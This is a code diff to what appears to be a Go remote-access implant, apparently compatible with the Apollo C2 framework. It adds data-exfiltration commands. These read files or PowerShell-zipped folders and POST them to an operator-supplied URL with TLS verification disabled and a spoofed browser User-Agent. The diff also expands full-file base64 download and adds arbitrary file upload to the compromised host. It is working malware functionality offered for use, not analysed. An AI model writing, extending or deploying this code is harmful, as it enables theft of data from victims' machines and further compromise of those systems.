@@ -419,6 +419,12 @@ func executeCommand(command, params string) string {
         case "unlink":
                 return unlinkSession(params)
         
+        // Data Exfiltration
+        case "exfiltrate":
+                return exfiltrateToServer(params)
+        case "zip_exfiltrate":
+                return zipAndExfiltrate(params)
+        
         // Miscellaneous
         case "printspoofer":
                 return printSpoofer(params)
@@ -639,10 +645,29 @@ func getSystemInfo() string {
         return executeShellCommand("uname -a")
 }
 
-func downloadFile(path string) string {
+func downloadFile(params string) string {
+        var path string
+        
+        // Check if params is JSON
+        if strings.HasPrefix(params, "{") {
+                var dlParams struct {
+                        Path string `json:"path"`
+                }
+                if err := json.Unmarshal([]byte(params), &dlParams); err == nil {
+                        path = dlParams.Path
+                } else {
+                        path = params
+                }
+        } else {
+                path = params
+        }
+        
         if path == "" {
                 return "No file path specified"
         }
+        
+        // Expand environment variables
+        path = os.ExpandEnv(path)
         
         data, err := ioutil.ReadFile(path)
         if err != nil {
@@ -650,7 +675,145 @@ func downloadFile(path string) string {
         }
         
         encoded := base64.StdEncoding.EncodeToString(data)
-        return fmt.Sprintf("File downloaded (base64): %s", encoded[:100] + "...")
+        
+        return fmt.Sprintf("File: %s\nSize: %d bytes\nBase64: %s", path, len(data), encoded)
+}
+
+// Advanced exfiltration commands
+func exfiltrateToServer(params string) string {
+        var exfilParams struct {
+                Path   string `json:"path"`
+                URL    string `json:"url"`
+                Method string `json:"method"`
+        }
+        
+        if err := json.Unmarshal([]byte(params), &exfilParams); err != nil {
+                return fmt.Sprintf("Error parsing exfiltration parameters: %v", err)
+        }
+        
+        // Expand environment variables
+        exfilParams.Path = os.ExpandEnv(exfilParams.Path)
+        
+        // Read file
+        data, err := ioutil.ReadFile(exfilParams.Path)
+        if err != nil {
+                return fmt.Sprintf("Error reading file: %v", err)
+        }
+        
+        // Create HTTP client
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 60 * time.Second,
+        }
+        
+        // Prepare request
+        var req *http.Request
+        if exfilParams.Method == "" {
+                exfilParams.Method = "POST"
+        }
+        
+        req, err = http.NewRequest(exfilParams.Method, exfilParams.URL, bytes.NewBuffer(data))
+        if err != nil {
+                return fmt.Sprintf("Error creating request: %v", err)
+        }
+        
+        req.Header.Set("Content-Type", "application/octet-stream")
+        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        
+        // Send request
+        resp, err := client.Do(req)
+        if err != nil {
+                return fmt.Sprintf("Error sending file: %v", err)
+        }
+        defer resp.Body.Close()
+        
+        return fmt.Sprintf("File %s exfiltrated to %s - Status: %d", exfilParams.Path, exfilParams.URL, resp.StatusCode)
+}
+
+func zipAndExfiltrate(params string) string {
+        var zipParams struct {
+                Path string `json:"path"`
+                URL  string `json:"url"`
+                Name string `json:"name"`
+        }
+        
+        if err := json.Unmarshal([]byte(params), &zipParams); err != nil {
+                return fmt.Sprintf("Error parsing zip parameters: %v", err)
+        }
+        
+        // Create temporary zip file
+        tempFile := fmt.Sprintf("temp_%d.zip", time.Now().Unix())
+        
+        // Use PowerShell to create zip
+        psCommand := fmt.Sprintf(`
+        $source = "%s"
+        $destination = "%s"
+        if (Test-Path $source) {
+                if ((Get-Item $source).PSIsContainer) {
+                        Compress-Archive -Path "$source\\*" -DestinationPath $destination -CompressionLevel Optimal
+                } else {
+                        Compress-Archive -Path $source -DestinationPath $destination -CompressionLevel Optimal
+                }
+                Write-Output "Zip created successfully"
+        } else {
+                Write-Output "Source path not found"
+        }
+        `, os.ExpandEnv(zipParams.Path), tempFile)
+        
+        cmd := exec.Command("powershell", "-Command", psCommand)
+        output, err := cmd.CombinedOutput()
+        
+        if err != nil {
+                return fmt.Sprintf("Error creating zip: %v - %s", err, string(output))
+        }
+        
+        // Read zip file
+        zipData, err := ioutil.ReadFile(tempFile)
+        if err != nil {
+                return fmt.Sprintf("Error reading zip file: %v", err)
+        }
+        
+        // Clean up temp file
+        defer os.Remove(tempFile)
+        
+        // Send to server if URL provided
+        if zipParams.URL != "" {
+                client := &http.Client{
+                        Transport: &http.Transport{
+                                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                        },
+                        Timeout: 120 * time.Second,
+                }
+                
+                req, err := http.NewRequest("POST", zipParams.URL, bytes.NewBuffer(zipData))
+                if err != nil {
+                        return fmt.Sprintf("Error creating request: %v", err)
+                }
+                
+                filename := zipParams.Name
+                if filename == "" {
+                        filename = fmt.Sprintf("exfil_%d.zip", time.Now().Unix())
+                }
+                
+                req.Header.Set("Content-Type", "application/zip")
+                req.Header.Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
+                req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+                
+                resp, err := client.Do(req)
+                if err != nil {
+                        return fmt.Sprintf("Error sending zip: %v", err)
+                }
+                defer resp.Body.Close()
+                
+                return fmt.Sprintf("Folder %s zipped and exfiltrated to %s - Status: %d - Size: %d bytes", 
+                        zipParams.Path, zipParams.URL, resp.StatusCode, len(zipData))
+        }
+        
+        // Return base64 if no URL
+        encoded := base64.StdEncoding.EncodeToString(zipData)
+        return fmt.Sprintf("Folder zipped successfully - Size: %d bytes - Base64: %s", len(zipData), encoded[:100]+"...")
 }
 
 // Apollo-compatible command implementations
@@ -732,7 +895,34 @@ func moveFile(params string) string {
 }
 
 func uploadFile(params string) string {
-        return "Upload functionality - specify file path and data"
+        var uploadParams struct {
+                Path     string `json:"path"`
+                Data     string `json:"data"`
+                URL      string `json:"url"`
+                Method   string `json:"method"`
+        }
+        
+        if strings.HasPrefix(params, "{") {
+                if err := json.Unmarshal([]byte(params), &uploadParams); err != nil {
+                        return fmt.Sprintf("Error parsing upload parameters: %v", err)
+                }
+        } else {
+                return "Upload requires JSON parameters: {\"path\": \"file.txt\", \"data\": \"base64data\"}"
+        }
+        
+        // Decode base64 data
+        data, err := base64.StdEncoding.DecodeString(uploadParams.Data)
+        if err != nil {
+                return fmt.Sprintf("Error decoding base64 data: %v", err)
+        }
+        
+        // Write file
+        err = ioutil.WriteFile(uploadParams.Path, data, 0644)
+        if err != nil {
+                return fmt.Sprintf("Error writing file: %v", err)
+        }
+        
+        return fmt.Sprintf("File uploaded successfully to: %s", uploadParams.Path)
 }
 
 // Credential/Token Commands
